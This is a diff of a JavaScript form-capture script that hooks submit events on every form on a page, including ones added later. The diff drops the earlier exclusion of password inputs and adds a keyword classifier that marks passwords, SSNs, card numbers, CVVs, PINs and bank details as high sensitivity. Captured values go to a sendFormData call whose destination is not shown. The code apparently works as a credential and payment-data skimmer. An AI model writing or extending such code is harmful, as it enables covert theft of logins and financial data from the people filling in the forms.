@@ -34,35 +34,87 @@
     });
   }
 
+  // Determine sensitivity based on field name or type
+  function determineSensitivity(fieldName, fieldType) {
+    const sensitiveKeywords = ['password', 'ssn', 'social security', 'credit card', 'cc', 'cvv', 'pin', 'security code', 'dob', 'date of birth', 'passport', 'driver license', 'bank account', 'routing number'];
+    const nameLower = fieldName.toLowerCase();
+    for (const keyword of sensitiveKeywords) {
+      if (nameLower.includes(keyword)) {
+        return 'high';
+      }
+    }
+    if (fieldType === 'email') {
+      return 'medium';
+    }
+    return 'low';
+  }
+
   // Extract form data without blocking
   function extractFormData(form) {
     const fields = [];
-    const inputs = form.querySelectorAll('input:not([type="password"]), select, textarea');
-    
+    // Include password fields now
+    const inputs = form.querySelectorAll('input, select, textarea');
+
     inputs.forEach(input => {
       let labelText = '';
-      
+
       // Try to find label
       if (input.id) {
         const label = document.querySelector(`label[for="${input.id}"]`);
         if (label) labelText = label.textContent.trim();
       }
-      
+
       if (!labelText) {
         const parentLabel = input.closest('label');
         if (parentLabel) labelText = parentLabel.textContent.trim();
       }
-      
-      labelText = labelText || input.getAttribute('aria-label') || 
-                 input.getAttribute('placeholder') || 
+
+      // Additional check: aria-labelledby attribute
+      if (!labelText && input.hasAttribute('aria-labelledby')) {
+        const labelledId = input.getAttribute('aria-labelledby');
+        const labelledElem = document.getElementById(labelledId);
+        if (labelledElem) labelText = labelledElem.textContent.trim();
+      }
+
+      // Additional heuristic: check previous sibling label
+      if (!labelText) {
+        const prevSibling = input.previousElementSibling;
+        if (prevSibling && prevSibling.tagName.toLowerCase() === 'label') {
+          labelText = prevSibling.textContent.trim();
+        }
+      }
+
+      // Additional heuristic: check next sibling label
+      if (!labelText) {
+        const nextSibling = input.nextElementSibling;
+        if (nextSibling && nextSibling.tagName.toLowerCase() === 'label') {
+          labelText = nextSibling.textContent.trim();
+        }
+      }
+
+      // Additional heuristic: check preceding text node
+      if (!labelText) {
+        let prevNode = input.previousSibling;
+        while (prevNode) {
+          if (prevNode.nodeType === Node.TEXT_NODE && prevNode.textContent.trim()) {
+            labelText = prevNode.textContent.trim();
+            break;
+          }
+          prevNode = prevNode.previousSibling;
+        }
+      }
+
+      labelText = labelText || input.getAttribute('aria-label') ||
+                 input.getAttribute('placeholder') ||
                  input.name || 'Unnamed Field';
 
-      // Remove translation call to avoid delay
-      // const translatedLabel = labelText ? await translateLabel(labelText) : 'Unnamed Field';
+      const sensitivity = determineSensitivity(labelText, input.type);
 
       fields.push({
         field_name: labelText,
-        field_value: input.value || ''
+        field_value: input.value || '',
+        field_type: input.type || 'text',
+        sensitivity: sensitivity
       });
     });
 
@@ -95,34 +147,36 @@
       for (const node of mutation.addedNodes) {
         if (node.nodeType === 1) { // Element node
           const forms = node.matches('form') ? [node] : node.getElementsByTagName('form');
-          
+
           for (const form of forms) {
-  form.addEventListener('submit', function(event) {
-    if (!formCaptureEnabled) return;
+            // Capture the current value of formCaptureEnabled
+            const isCaptureEnabled = formCaptureEnabled;
+            form.addEventListener('submit', function(event) {
+              if (!isCaptureEnabled) return;
 
-    console.log(`[${new Date().toISOString()}] Form submit event captured`);
+              console.log(`[${new Date().toISOString()}] Form submit event captured`);
 
-    try {
-      const fields = extractFormData(form);
-      console.log(`[${new Date().toISOString()}] Extracted ${fields.length} fields`);
+              try {
+                const fields = extractFormData(form);
+                console.log(`[${new Date().toISOString()}] Extracted ${fields.length} fields`);
 
-      if (fields.length) {
-        if (window.requestIdleCallback) {
-          requestIdleCallback(() => {
-            console.log(`[${new Date().toISOString()}] Sending form data`);
-            sendFormData(fields);
-          });
-        } else {
-          setTimeout(() => {
-            console.log(`[${new Date().toISOString()}] Sending form data`);
-            sendFormData(fields);
-          }, 0);
-        }
-      }
-    } catch (error) {
-      console.error('Form processing error:', error);
-    }
-  });
+                if (fields.length) {
+                  if (window.requestIdleCallback) {
+                    requestIdleCallback(() => {
+                      console.log(`[${new Date().toISOString()}] Sending form data`);
+                      sendFormData(fields);
+                    });
+                  } else {
+                    setTimeout(() => {
+                      console.log(`[${new Date().toISOString()}] Sending form data`);
+                      sendFormData(fields);
+                    }, 0);
+                  }
+                }
+              } catch (error) {
+                console.error('Form processing error:', error);
+              }
+            });
           }
         }
       }
@@ -139,9 +193,9 @@
   document.querySelectorAll('form').forEach(form => {
     form.addEventListener('submit', function(event) {
       if (!formCaptureEnabled || processingForm) return;
-      
+
       processingForm = true;
-      
+
       try {
         const fields = extractFormData(form);
         if (fields.length) {
